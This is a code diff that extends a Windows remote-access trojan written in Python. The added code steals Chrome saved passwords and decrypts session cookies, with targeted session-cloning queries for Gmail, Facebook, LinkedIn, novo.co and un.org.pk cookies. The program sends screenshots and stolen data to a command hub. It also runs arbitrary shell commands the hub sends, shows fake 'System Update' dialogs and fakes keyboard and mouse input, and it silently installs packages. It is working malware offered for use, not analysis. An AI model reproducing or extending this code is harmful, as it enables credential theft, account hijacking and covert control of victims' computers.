@@ -17,6 +17,18 @@ import time
 import uuid
 import winreg
 
+def install_dependencies():
+    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow']
+    for lib in required:
+        try:
+            __import__(lib if lib != 'pycryptodome' else 'Crypto')
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
+
+install_dependencies()
+
+import pyautogui
+
 # Optional dependencies
 try:
     from Crypto.Cipher import AES
@@ -66,6 +78,7 @@ except ImportError:
     PSUTIL_AVAILABLE = False
 
 REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
+
 DRIVE_FIXED = 3
 DRIVE_REMOVABLE = 2
 
@@ -247,8 +260,7 @@ def capture_desktop_screenshot(client):
             buffer = io.BytesIO()
             image.save(buffer, format='JPEG', quality=60, optimize=True)
             jpg_data = buffer.getvalue()
-            client.sendall(b'IMG_FIXED\n')
-            client.sendall(str(len(jpg_data)).zfill(10).encode('utf-8') + jpg_data + b'V_PULSE_EOF')
+            send_atomic_data(client, 'SCREENSHOT', jpg_data, 'screenshot.jpg')
     except Exception as e:
         try:
             client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
@@ -428,6 +440,23 @@ def decrypt_dpapi(encrypted_bytes):
     return None
 
 
+def safe_copy(source, destination):
+    """Attempt to copy a locked database file up to 3 times."""
+    import time
+    for i in range(3):
+        try:
+            # Use shutil.copy as a base, but wrap it in a retry
+            import shutil
+            shutil.copy2(source, destination)
+            return True
+        except PermissionError:
+            # If locked, wait 1 second and try again
+            time.sleep(1)
+        except Exception:
+            break
+    return False
+
+
 def extract_chrome_credentials():
     try:
         import ctypes, sqlite3, json, os, base64, shutil, glob
@@ -482,41 +511,49 @@ def extract_chrome_credentials():
                 # Use a unique temp name to avoid file locks
                 temp_db = os.path.join(os.getenv('TEMP'), f"v_db_{os.urandom(2).hex()}.db")
                 try:
-                    shutil.copy2(login_data_path, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    
-                    # We pull EVERYTHING: URL, Username, and the Raw Password Blob
-                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                    
-                    rows = cursor.fetchall()
-                    for url, user, enc_pass in rows:
-                        if not user and not enc_pass: continue
-                        
-                        password = " [No Password Saved] "
-                        if enc_pass:
-                            try:
-                                # Try Modern Decryption
-                                if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
-                                    nonce = enc_pass[3:15]
-                                    payload = enc_pass[15:]
-                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                    # Try to decrypt and verify the tag
-                                    password = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
-                                else:
-                                    # Try Legacy DPAPI
-                                    blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
-                                    blob_out = DATA_BLOB()
-                                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
-                                        password = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='ignore')
-                                        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-                            except:
-                                password = "[Decryption Failed]"
+                    # Use the safe_copy function instead of direct shutil.copy2
+                    if safe_copy(login_data_path, temp_db):
+                        try:
+                            # 1. Connect using URI for Read-Only access
+                            conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
+                            cursor = conn.cursor()
+                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                            
+                            # 2. Fetch ALL data into memory IMMEDIATELY
+                            # This prevents the "Closed Database" error because we don't need the DB anymore
+                            all_rows = cursor.fetchall()
+                            conn.close() 
 
-                        profile_name = os.path.basename(os.path.dirname(login_data_path))
-                        output.append(f"Profile: {profile_name}\nURL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
-                    
-                    conn.close()
+                            # 3. Process the data from RAM, not from the file
+                            for url, user, enc_pass in all_rows:
+                                if not user and not enc_pass: continue
+                                
+                                password = " [No Password Saved] "
+                                if enc_pass:
+                                    try:
+                                        # Try Modern Decryption
+                                        if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
+                                            nonce = enc_pass[3:15]
+                                            payload = enc_pass[15:]
+                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                            # Try to decrypt and verify the tag
+                                            password = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                        else:
+                                            # Try Legacy DPAPI
+                                            blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
+                                            blob_out = DATA_BLOB()
+                                            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
+                                                password = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='ignore')
+                                                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+                                    except:
+                                        password = "[Decryption Failed]"
+
+                                profile_name = os.path.basename(os.path.dirname(login_data_path))
+                                output.append(f"Profile: {profile_name}\nURL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
+
+                        except Exception as e:
+                            # If the DB itself is corrupted, catch it here
+                            output.append(f"[!] Logic Error: {str(e)}")
 
                     # --- SESSION GHOST: COOKIE EXTRACTION ---
                     cookie_output = []
@@ -525,28 +562,36 @@ def extract_chrome_credentials():
                     if os.path.exists(cookie_path):
                         temp_c = os.path.join(os.getenv('TEMP'), f"c_task_{os.urandom(2).hex()}.db")
                         try:
-                            shutil.copy2(cookie_path, temp_c)
-                            c_conn = sqlite3.connect(temp_c)
-                            c_cursor = c_conn.cursor()
-                            
-                            # We target high-value session cookies
-                            c_cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
-                            
-                            for host, name, enc_val, path, expires in c_cursor.fetchall():
-                                if not enc_val.startswith(b'v10'): continue
-                                
+                            if safe_copy(cookie_path, temp_c):
                                 try:
-                                    # Same AES-GCM Surgical Slice
-                                    nonce = enc_val[3:15]
-                                    payload = enc_val[15:]
-                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                    cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                    c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
+                                    c_cursor = c_conn.cursor()
+                                
+                                    # We target high-value session cookies
+                                    c_cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
                                     
-                                    if cookie_val:
-                                        cookie_output.append(f"Host: {host} | Name: {name} | Value: {cookie_val}")
-                                except:
-                                    continue
-                            c_conn.close()
+                                    # Fetch all into memory
+                                    all_cookie_rows = c_cursor.fetchall()
+                                    c_conn.close()
+                                    
+                                    # Process from RAM
+                                    for host, name, enc_val, path, expires in all_cookie_rows:
+                                        if not enc_val.startswith(b'v10'): continue
+                                        
+                                        try:
+                                            # Same AES-GCM Surgical Slice
+                                            nonce = enc_val[3:15]
+                                            payload = enc_val[15:]
+                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                            cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                            
+                                            if cookie_val:
+                                                cookie_output.append(f"Host: {host} | Name: {name} | Value: {cookie_val}")
+                                        except:
+                                            continue
+                                except Exception as e:
+                                    # Handle cookie DB errors
+                                    pass
                         finally:
                             if os.path.exists(temp_c): os.remove(temp_c)
 
@@ -554,6 +599,84 @@ def extract_chrome_credentials():
                         output.append("\n--- SESSION COOKIES ---\n" + "\n".join(cookie_output))
                 finally:
                     if os.path.exists(temp_db): os.remove(temp_db)
+
+            # --- THE SESSION CLONING LOGIC ---
+            cloning_output = []
+            cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
+
+            if os.path.exists(cookie_path):
+                temp_c = os.path.join(os.getenv('TEMP'), f"c_shadow_{os.urandom(2).hex()}.db")
+                try:
+                    if safe_copy(cookie_path, temp_c):
+                        try:
+                            c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
+                            c_cursor = c_conn.cursor()
+                            # We only need the Session Cookies for high-value targets
+                            c_cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%novo.co%' OR host_key LIKE '%gmail.com%'")
+                            
+                            all_cookies = c_cursor.fetchall()
+                            c_conn.close()
+                            
+                            for host, name, enc_val in all_cookies:
+                                if not enc_val.startswith(b'v10'): continue
+                                
+                                try:
+                                    # Decrypt using your existing AES-GCM logic
+                                    nonce = enc_val[3:15]
+                                    payload = enc_val[15:]
+                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                    decrypted_cookie = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                    
+                                    if decrypted_cookie:
+                                        cloning_output.append(f"COOKIE | Host: {host} | Name: {name} | Value: {decrypted_cookie}")
+                                except:
+                                    continue
+                        except Exception as e:
+                            cloning_output.append(f"Cookie Error: {str(e)}")
+                finally:
+                    if os.path.exists(temp_c): os.remove(temp_c)
+
+            if cloning_output:
+                output.append("\n--- SESSION CLONING ---\n" + "\n".join(cloning_output))
+
+            # --- TARGETING THE SESSION GHOST ---
+            ghost_output = []
+            cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 5', 'Network', 'Cookies')
+
+            if os.path.exists(cookie_path):
+                temp_c = os.path.join(os.getenv('TEMP'), f"c_vault_{os.urandom(2).hex()}.db")
+                try:
+                    if safe_copy(cookie_path, temp_c):
+                        try:
+                            c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
+                            c_cursor = c_conn.cursor()
+                            # Pulling session tokens for the targets in your list
+                            c_cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook%' OR host_key LIKE '%linkedin%' OR host_key LIKE '%un.org.pk%'")
+                            
+                            all_ghost_cookies = c_cursor.fetchall()
+                            c_conn.close()
+                            
+                            for host, name, enc_val in all_ghost_cookies:
+                                if not enc_val.startswith(b'v10'): continue
+                                
+                                try:
+                                    # Use the SAME decryption logic you have for passwords
+                                    nonce = enc_val[3:15]
+                                    payload = enc_val[15:]
+                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                    cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                    
+                                    if cookie_val:
+                                        ghost_output.append(f"SESSION_TOKEN | Host: {host} | Name: {name} | Value: {cookie_val}")
+                                except:
+                                    continue
+                        except Exception as e:
+                            ghost_output.append(f"Session Ghost Error: {str(e)}")
+                finally:
+                    if os.path.exists(temp_c): os.remove(temp_c)
+
+            if ghost_output:
+                output.append("\n--- SESSION GHOST ---\n" + "\n".join(ghost_output))
 
             # If the output is still empty, it means the 'logins' table is physically empty
             if not output:
@@ -604,19 +727,41 @@ def connect_to_hub(hub_ip, port):
                     if not command:
                         continue
 
-                    if command == 'STATUS_REPORT':
+                    elif command == 'STATUS_REPORT':
                         client.sendall(f'STATUS:{report_status()}\n'.encode('utf-8'))
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'DESKTOP_CAPTURE':
                         capture_desktop_screenshot(client)
+                    elif command == 'SCREENSHOT':
+                        try:
+                            from mss import mss
+                            with mss() as sct:
+                                # Capture and save locally first
+                                temp_img = os.path.join(os.getenv('TEMP'), "v_shot.png")
+                                sct.shot(output=temp_img)
+
+                            with open(temp_img, "rb") as f:
+                                img_data = f.read()
+
+                            # Send THE HEADER: Type|Size|Name
+                            header = f"DATA_HEADER|SCREENSHOT|{len(img_data)}|snap_{int(time.time())}.png\n"
+                            client.sendall(header.encode() + img_data + b"V_PULSE_EOF")
+
+                            # Clean up
+                            os.remove(temp_img)
+                        except Exception as e:
+                            client.sendall(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
                     elif command == 'ENSURE_SERVICE_CONTINUITY':
                         ensure_service_continuity()
                         client.sendall(b'SERVICE_CONTINUITY_OK\n')
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'SHUTDOWN_NODE':
                         print('[*] Shutdown command received.')
                         return
                     elif command == 'PING':
                         client.sendall(b'PING_OK\n')
-                    elif 'MESSAGE' in command:
+                        client.sendall(b'V_PULSE_EOF\n')
+                    elif command.startswith('MESSAGE '):
                         # Syntax: MESSAGE "text"
                         try:
                             msg_text = command.split('"')[1]
@@ -624,7 +769,8 @@ def connect_to_hub(hub_ip, port):
                             ctypes.windll.user32.MessageBoxW(0, msg_text, 'System Update', 64)
                         except:
                             pass
-                    elif 'SHELL' in command:
+                        client.sendall(b'V_PULSE_EOF\n')
+                    elif command.startswith('SHELL '):
                         # Syntax: SHELL "cmd"
                         try:
                             cmd_text = command.split('"')[1]
@@ -632,13 +778,38 @@ def connect_to_hub(hub_ip, port):
                             subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         except:
                             pass
-                    elif 'GHOST_OPEN' in command or 'open' in command:
+                        client.sendall(b'V_PULSE_EOF\n')
+                    elif command.startswith('GHOST_OPEN|') or command.startswith('open '):
                         try:
-                            target_url = command.split('|')[1] if '|' in command else command.split(' ')[1]
+                            if command.startswith('GHOST_OPEN|'):
+                                target_url = command.split('|', 1)[1]
+                            else:
+                                target_url = command.split(' ', 1)[1]
                             import webbrowser
                             webbrowser.open(target_url)
                         except:
                             pass
+                        client.sendall(b'V_PULSE_EOF\n')
+                    elif command == 'GHOST_MOVE':
+                        if not PYAUTOGUI_AVAILABLE:
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                        else:
+                            try:
+                                pyautogui.moveRel(10, 0, duration=0.1)
+                                pyautogui.moveRel(-10, 0, duration=0.1)
+                            except Exception:
+                                pass
+                        client.sendall(b'V_PULSE_EOF\n')
+                    elif command.startswith('GHOST_TYPE|'):
+                        if not PYAUTOGUI_AVAILABLE:
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                        else:
+                            try:
+                                text = command.split('|', 1)[1]
+                                pyautogui.typewrite(text)
+                            except Exception:
+                                pass
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'KILL_AGENT':
                         try:
                             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
